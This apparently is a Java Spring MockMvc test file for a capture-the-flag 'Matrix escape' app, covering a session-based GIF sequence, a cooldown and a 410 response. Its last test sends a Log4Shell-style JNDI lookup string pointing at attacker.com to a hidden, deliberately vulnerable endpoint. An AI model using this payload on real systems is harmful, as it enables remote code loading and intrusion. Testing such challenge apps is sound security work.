package com.example.ctf;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.mock.web.MockHttpSession;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders;

import static org.springframework.test.web.servlet.result.MockMvcResultHandlers.print;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

@SpringBootTest
@AutoConfigureMockMvc
public class MatrixControllerTest {

    @Autowired
    private MockMvc mockMvc;

    private MockHttpSession session;

    @BeforeEach
    public void setup() {
        session = new MockHttpSession();
    }

    private String getEnterTheVoidPayload() {
        return "{\"signal\": \"test-signal\", \"trace\": \"test-trace\", \"entropy\": \"test-entropy\", \"node\": \"test-node\"}";
    }

    @Test
    public void testSuccessfulGifSequence() throws Exception {
        System.out.println("### Starting testSuccessfulGifSequence ###");
        // Test first 4 steps
        for (int i = 0; i < 4; i++) {
            mockMvc.perform(MockMvcRequestBuilders.post("/api/escape")
                    .session(session)
                    .contentType(MediaType.APPLICATION_JSON)
                    .content(getEnterTheVoidPayload()))
                    .andDo(print())
                    .andExpect(status().isOk())
                    .andExpect(header().exists("X-Matrix-Id"))
                    .andExpect(content().contentType(MediaType.IMAGE_GIF));
        }
    }

    @Test
    public void testCompleteSequence() throws Exception {
        System.out.println("### Starting testCompleteSequence ###");
        // Complete all 13 steps
        for (int i = 0; i < 13; i++) {
            mockMvc.perform(MockMvcRequestBuilders.post("/api/escape")
                    .session(session)
                    .contentType(MediaType.APPLICATION_JSON)
                    .content(getEnterTheVoidPayload()))
                    .andDo(print())
                    .andExpect(status().isOk())
                    .andExpect(header().exists("X-Matrix-Id"));
        }

        // Step 14 (should be GONE)
        mockMvc.perform(MockMvcRequestBuilders.post("/api/escape")
                .session(session)
                .contentType(MediaType.APPLICATION_JSON)
                .content(getEnterTheVoidPayload()))
                .andDo(print())
                .andExpect(status().isGone());
    }

    @Test
    public void testNewSessionAlwaysStartsAtBeginning() throws Exception {
        System.out.println("### Starting testNewSessionAlwaysStartsAtBeginning ###");
        // Different sessions should have different sequences
        MockHttpSession session1 = new MockHttpSession();
        mockMvc.perform(MockMvcRequestBuilders.post("/api/escape")
                .session(session1)
                .contentType(MediaType.APPLICATION_JSON)
                .content(getEnterTheVoidPayload()))
                .andDo(print())
                .andExpect(status().isOk())
                .andExpect(header().exists("X-Matrix-Id"));

        MockHttpSession session2 = new MockHttpSession();
        mockMvc.perform(MockMvcRequestBuilders.post("/api/escape")
                .session(session2)
                .contentType(MediaType.APPLICATION_JSON)
                .content(getEnterTheVoidPayload()))
                .andDo(print())
                .andExpect(status().isOk())
                .andExpect(header().exists("X-Matrix-Id"));

        // session1 progresses
        mockMvc.perform(MockMvcRequestBuilders.post("/api/escape")
                .session(session1)
                .contentType(MediaType.APPLICATION_JSON)
                .content(getEnterTheVoidPayload()))
                .andDo(print())
                .andExpect(status().isOk());
    }

    @Test
    public void testCooldown() throws Exception {
        System.out.println("### Starting testCooldown ###");
        mockMvc.perform(MockMvcRequestBuilders.post("/api/escape")
                .session(session)
                .contentType(MediaType.APPLICATION_JSON)
                .content(getEnterTheVoidPayload()))
                .andDo(print())
                .andExpect(status().isOk());

        // Immediately send another request
        mockMvc.perform(MockMvcRequestBuilders.post("/api/escape")
                .session(session)
                .contentType(MediaType.APPLICATION_JSON)
                .content(getEnterTheVoidPayload()))
                .andDo(print())
                .andExpect(status().isTooManyRequests());

        // Wait for cooldown to pass
        Thread.sleep(1100);

        mockMvc.perform(MockMvcRequestBuilders.post("/api/escape")
                .session(session)
                .contentType(MediaType.APPLICATION_JSON)
                .content(getEnterTheVoidPayload()))
                .andDo(print())
                .andExpect(status().isOk());
    }

    @Test
    public void testVulnerableEndpoint() throws Exception {
        System.out.println("### Starting testVulnerableEndpoint ###");
        String vulnerablePayload = "{\"tr4c3\": \"test\", \"v0id\": \"${jndi:ldap://attacker.com/a}\", \"3ntr0py\": \"test\", \"n0dE\": \"test\"}";
        
        mockMvc.perform(MockMvcRequestBuilders.post("/api/m4tr1x_Esc4p3d/enT3r_th3_v0iD")
                .session(session)
                .contentType(MediaType.APPLICATION_JSON)
                .content(vulnerablePayload))
                .andDo(print())
                .andExpect(status().isOk())
                .andExpect(content().contentType(MediaType.APPLICATION_JSON));
    }
}
